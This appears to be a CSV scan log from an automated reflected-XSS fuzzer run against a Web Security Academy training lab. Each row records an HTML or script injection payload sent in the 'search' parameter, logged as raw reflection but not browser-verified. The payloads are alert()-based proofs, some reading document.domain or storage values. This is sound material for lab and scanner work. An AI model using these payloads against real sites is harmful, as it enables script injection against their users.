Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:02:20.434,2026-01-10 16:02:20.672,0.238,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,No,,High
2026-01-10 16:02:20.672,2026-01-10 16:02:20.980,0.309,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,No,,High
2026-01-10 16:02:20.980,2026-01-10 16:02:21.300,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,RAW_REFLECTION,No,,High
2026-01-10 16:02:21.300,2026-01-10 16:02:21.620,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:21.620,2026-01-10 16:02:21.940,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<keygen onchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:21.940,2026-01-10 16:02:22.259,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,No,,High
2026-01-10 16:02:22.259,2026-01-10 16:02:22.579,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:22.579,2026-01-10 16:02:22.821,0.242,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:22.821,2026-01-10 16:02:23.059,0.237,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:02:23.059,2026-01-10 16:02:23.257,0.198,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img crossorigin=anonymous src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:23.257,2026-01-10 16:02:23.448,0.191,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script crossorigin=anonymous src=x onerror=alert(1)></script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:23.448,2026-01-10 16:02:23.651,0.203,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,No,,High
2026-01-10 16:02:23.651,2026-01-10 16:02:23.858,0.207,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:23.858,2026-01-10 16:02:24.045,0.187,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:24.045,2026-01-10 16:02:24.339,0.294,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:24.339,2026-01-10 16:02:24.536,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:24.536,2026-01-10 16:02:24.820,0.284,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onabort=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:24.820,2026-01-10 16:02:25.139,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:25.139,2026-01-10 16:02:25.306,0.167,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onseeking=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:25.306,2026-01-10 16:02:25.619,0.313,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onseeked=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:25.619,2026-01-10 16:02:25.939,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onplaying=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:25.939,2026-01-10 16:02:26.136,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onplay=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:26.136,2026-01-10 16:02:26.419,0.283,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onpause=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:26.419,2026-01-10 16:02:26.616,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:26.616,2026-01-10 16:02:26.824,0.208,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:26.824,2026-01-10 16:02:27.025,0.201,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:27.025,2026-01-10 16:02:27.240,0.216,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onended=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:27.241,2026-01-10 16:02:27.538,0.297,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:27.538,2026-01-10 16:02:27.859,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:27.859,2026-01-10 16:02:28.038,0.179,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:28.038,2026-01-10 16:02:28.338,0.300,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,No,,High
2026-01-10 16:02:28.338,2026-01-10 16:02:28.658,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,No,,High
2026-01-10 16:02:28.658,2026-01-10 16:02:28.979,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,No,,High
2026-01-10 16:02:28.979,2026-01-10 16:02:29.303,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(document.domain)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:29.303,2026-01-10 16:02:29.500,0.198,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(window.location)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:29.500,2026-01-10 16:02:29.777,0.277,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:29.777,2026-01-10 16:02:30.099,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:30.099,2026-01-10 16:02:30.418,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:30.418,2026-01-10 16:02:30.737,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:30.737,2026-01-10 16:02:31.058,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(window.name)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:31.058,2026-01-10 16:02:31.378,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(window.safari)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:31.378,2026-01-10 16:02:31.698,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(window.chrome)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:31.698,2026-01-10 16:02:32.018,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,No,,High
2026-01-10 16:02:32.018,2026-01-10 16:02:32.338,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<acronym onmouseover=alert(1)>X</acronym>,RAW_REFLECTION,No,,High
2026-01-10 16:02:32.338,2026-01-10 16:02:32.657,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,No,,High
2026-01-10 16:02:32.657,2026-01-10 16:02:32.977,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,No,,High
2026-01-10 16:02:32.977,2026-01-10 16:02:33.302,0.325,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,No,,High
2026-01-10 16:02:33.302,2026-01-10 16:02:33.618,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<font onmouseover=alert(1)>X</font>,RAW_REFLECTION,No,,High
2026-01-10 16:02:33.618,2026-01-10 16:02:33.936,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<frame onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:33.936,2026-01-10 16:02:34.258,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<frameset onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:34.258,2026-01-10 16:02:34.578,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<noframes onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:34.578,2026-01-10 16:02:34.897,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,No,,High
2026-01-10 16:02:34.897,2026-01-10 16:02:35.217,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,No,,High
2026-01-10 16:02:35.217,2026-01-10 16:02:35.399,0.182,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:35.399,2026-01-10 16:02:35.569,0.169,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:35.569,2026-01-10 16:02:35.857,0.289,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:35.858,2026-01-10 16:02:36.021,0.164,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>if(1){alert(1)}</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:36.021,2026-01-10 16:02:36.337,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:36.338,2026-01-10 16:02:36.658,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:36.658,2026-01-10 16:02:36.977,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:36.977,2026-01-10 16:02:37.297,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:37.297,2026-01-10 16:02:37.617,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>alert([1,2,3])</script>",RAW_REFLECTION,No,,High
2026-01-10 16:02:37.617,2026-01-10 16:02:37.937,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,No,,High
2026-01-10 16:02:37.937,2026-01-10 16:02:38.261,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:38.261,2026-01-10 16:02:38.459,0.198,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert((()=>1)())</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:38.459,2026-01-10 16:02:38.663,0.203,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,No,,High
